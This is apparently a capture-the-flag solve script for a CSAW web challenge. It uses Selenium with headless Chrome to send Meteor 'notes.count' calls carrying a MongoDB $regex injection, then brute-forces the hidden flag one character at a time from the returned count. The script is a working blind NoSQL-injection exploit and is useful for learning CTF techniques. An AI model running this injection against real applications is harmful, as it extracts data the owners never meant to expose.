# setup uses chrome. requires `chromedriver` binary to be installed and
# available on $PATH. also requires the `selenium` package from pip
import string
import time

from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

# change these as needed
BIN_PATH = "/usr/bin/google-chrome-stable"
HOST = "http://web.chal.csaw.io:5002/"


# setup driver and connect to server
def connect(bin_path, host):
    caps = DesiredCapabilities.CHROME
    caps["goog:loggingPrefs"] = {"browser": "ALL"}

    opts = webdriver.ChromeOptions()
    opts.add_argument("--headless")
    opts.binary = bin_path

    driver = webdriver.Chrome(desired_capabilities=caps, options=opts)
    driver.get(host)
    
    return driver


# construct payload with flag guess and execute it in browser console
def send(driver, flag):
    payload = f"Meteor.call('notes.count', {{body: {{$regex: '{flag}'}}}}, console.log)"
    driver.execute_script(payload)


# retrieve and parse output from previously sent payload
def recv(driver):
    for line in driver.get_log("browser"):
        res = line["message"].split(" undefined ")[1]
        return res


if __name__ == "__main__":
    driver = connect(BIN_PATH, HOST)
    flag = "flag{"
    res = 0

    # potential characters in flag
    printable = "{_}" + string.digits + string.ascii_letters

    while flag[-1] != "}":
        for char in printable:
            guess = flag + char
            print(f"[-] Trying: {guess}", end="\r")

            send(driver, guess)
            time.sleep(0.1)
            res = recv(driver)

            # return value of 1 indicates the guess is correct
            if res == "1":
                flag = guess
                print(f"[+] Progress: {flag}")
                break

    print(f"Flag: {flag}")
    driver.quit()
